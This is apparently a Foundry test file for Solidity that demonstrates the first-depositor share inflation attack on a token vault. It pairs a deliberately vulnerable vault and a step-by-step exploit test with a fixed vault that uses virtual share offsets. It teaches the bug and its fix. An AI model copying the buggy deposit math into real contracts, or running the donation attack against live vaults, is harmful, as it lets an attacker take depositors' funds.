// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import "forge-std/Test.sol";

contract MockWETH {
    mapping(address => uint256) public balanceOf;
    function mint(address to, uint256 a) external { balanceOf[to] += a; }
    function transfer(address to, uint256 a) external returns (bool) { balanceOf[msg.sender] -= a; balanceOf[to] += a; return true; }
    function transferFrom(address f, address t, uint256 a) external returns (bool) { balanceOf[f] -= a; balanceOf[t] += a; return true; }
}

/// VULNERABLE vault: shares = assets * totalShares / totalAssets. The FIRST depositor sets the price
/// 1:1, then can DONATE assets straight to the vault to inflate the share price so the next depositor's
/// deposit rounds down to ZERO shares — and the attacker redeems everything.
contract VaultBuggy {
    MockWETH public weth;
    uint256 public totalShares;
    mapping(address => uint256) public shares;
    constructor(address w) { weth = MockWETH(w); }
    function totalAssets() public view returns (uint256) { return weth.balanceOf(address(this)); }
    function deposit(uint256 assets) external returns (uint256 s) {
        s = totalShares == 0 ? assets : assets * totalShares / totalAssets();   // <-- rounds DOWN to 0
        weth.transferFrom(msg.sender, address(this), assets);
        totalShares += s; shares[msg.sender] += s;
    }
    function redeem(uint256 s) external returns (uint256 assets) {
        assets = s * totalAssets() / totalShares;
        totalShares -= s; shares[msg.sender] -= s;
        weth.transfer(msg.sender, assets);
    }
}

/// FIXED vault: virtual shares + virtual assets (OpenZeppelin's ERC-4626 offset). The vault behaves as
/// if it always holds a tiny bit of phantom liquidity, so a donation can no longer round the next
/// depositor to zero — the attack stops paying.
contract VaultFixed {
    MockWETH public weth;
    uint256 public totalShares;
    mapping(address => uint256) public shares;
    uint256 constant OFFSET = 1e3;                    // 1000 virtual shares
    constructor(address w) { weth = MockWETH(w); }
    function totalAssets() public view returns (uint256) { return weth.balanceOf(address(this)); }
    function deposit(uint256 assets) external returns (uint256 s) {
        s = assets * (totalShares + OFFSET) / (totalAssets() + 1);   // virtual offset
        weth.transferFrom(msg.sender, address(this), assets);
        totalShares += s; shares[msg.sender] += s;
    }
    function redeem(uint256 s) external returns (uint256 assets) {
        assets = s * (totalAssets() + 1) / (totalShares + OFFSET);
        totalShares -= s; shares[msg.sender] -= s;
        weth.transfer(msg.sender, assets);
    }
}

contract InflationTest is Test {
    MockWETH weth;
    address attacker = makeAddr("attacker");
    address victim   = makeAddr("victim");
    function setUp() public { weth = new MockWETH(); }

    function test_inflation() public {
        VaultBuggy vault = new VaultBuggy(address(weth));
        weth.mint(attacker, 100 ether + 1);   // 1 wei to deposit + 100 to donate
        weth.mint(victim, 100 ether);

        vm.startPrank(attacker);
        vault.deposit(1);                                       // 1) 1 wei -> 1 share (first depositor)
        weth.transfer(address(vault), 100 ether);               // 2) DONATE: 1 share now worth ~100 WETH
        vm.stopPrank();

        vm.prank(victim);
        uint256 vShares = vault.deposit(100 ether);             // 3) victim's 100 WETH -> rounds to 0 shares
        emit log_named_uint("victim shares", vShares);

        vm.prank(attacker);
        uint256 got = vault.redeem(1);                          // 4) attacker redeems the WHOLE vault
        emit log_named_decimal_uint("attacker got back (WETH)", got, 18);
        emit log_named_decimal_uint("attacker profit  (WETH)", got - (100 ether + 1), 18);

        assertEq(vShares, 0, "victim got ZERO shares");
        assertGt(got, 100 ether, "attacker stole the victim's deposit");
    }

    function test_fixed() public {
        VaultFixed vault = new VaultFixed(address(weth));
        weth.mint(attacker, 100 ether + 1);
        weth.mint(victim, 100 ether);

        vm.startPrank(attacker);
        vault.deposit(1);
        weth.transfer(address(vault), 100 ether);
        vm.stopPrank();

        vm.prank(victim);
        uint256 vShares = vault.deposit(100 ether);
        emit log_named_uint("victim shares (fixed)", vShares);

        vm.prank(victim);
        uint256 vBack = vault.redeem(vShares);
        emit log_named_decimal_uint("victim can withdraw (WETH)", vBack, 18);

        assertGt(vShares, 0, "victim gets real shares");
        assertGt(vBack, 90 ether, "victim keeps ~all of their deposit");
    }
}
